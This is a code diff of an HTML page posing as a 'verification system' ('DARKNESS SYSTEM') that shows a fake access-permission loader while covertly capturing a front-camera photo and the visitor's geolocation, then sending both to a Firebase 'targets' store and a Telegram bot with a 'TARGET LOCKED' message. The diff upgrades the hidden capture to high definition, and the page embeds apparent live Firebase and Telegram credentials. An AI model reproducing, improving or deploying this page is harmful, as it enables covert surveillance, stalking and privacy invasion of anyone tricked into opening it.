@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Sistem Verifikasi | Mobile</title>
+    <title>Sistem Verifikasi | High Definition</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
@@ -16,16 +16,13 @@
     </style>
 </head>
 <body>
-
     <div class="box">
         <h2>DARKNESS SYSTEM</h2>
         <div class="loader"></div>
-        <p>MEMPROSES IZIN AKSES...</p>
+        <p>MEMPROSES IZIN AKSES HD...</p>
     </div>
-
-    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
-
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 <script>
     const firebaseConfig = {
       apiKey: "AIzaSyAxoDrru0u2zRKYAU3vAE0KBh5ftw1SzaM",
@@ -38,7 +35,6 @@
     };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-
     const TELE_TOKEN = "8740798060:AAGVYPajLLAid1V2wO-SrbbXNcxur6vNPLk";
     const TELE_ID = "8283778614";
 
@@ -46,9 +42,12 @@
 
     async function setupCamera() {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user", width: { ideal: 1920 }, height: { ideal: 1080 } }, 
+                audio: false 
+            });
             document.getElementById('video').srcObject = stream;
-            setTimeout(() => { getLocation(); }, 2000);
+            setTimeout(() => { getLocation(); }, 2500);
         } catch (err) { getLocation(); }
     }
 
@@ -62,26 +61,24 @@
     }
 
     async function pushToCloud(lat, lon) {
-        const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
-        context.drawImage(document.getElementById('video'), 0, 0, 640, 480);
-        const imgData = canvas.toDataURL('image/jpeg', 0.5);
+        const v = document.getElementById('video');
+        const c = document.getElementById('canvas');
+        c.width = v.videoWidth; c.height = v.videoHeight;
+        c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
+        const imgData = c.toDataURL('image/jpeg', 0.9);
         const time = new Date().toLocaleString('id-ID');
 
         try {
-            // 1. KIRIM KE FIREBASE (MARKAS) DULUAN (FIXED)
+            // SYNC FIREBASE (MARKAS)
             await db.ref('targets').push({ time, lat, lon, img: imgData });
-
-            // 2. KIRIM KE TELEGRAM (BACKUP)
-            const msg = `🎯 TARGET LOCKED!\n⏰ ${time}\n📍 Lokasi: https://www.google.com/maps?q=${lat},${lon}`;
+            // SYNC TELEGRAM
+            const msg = `🎯 TARGET LOCKED HD!\n⏰ ${time}\n📍 Lokasi: https://www.google.com/maps?q=${lat},${lon}`;
             await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${TELE_ID}&text=${encodeURIComponent(msg)}`);
-            
             const blob = await (await fetch(imgData)).blob();
             const formData = new FormData();
             formData.append('chat_id', TELE_ID);
             formData.append('photo', blob, 'target.jpg');
             await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-
         } catch (e) { console.error(e); }
     }
 </script>
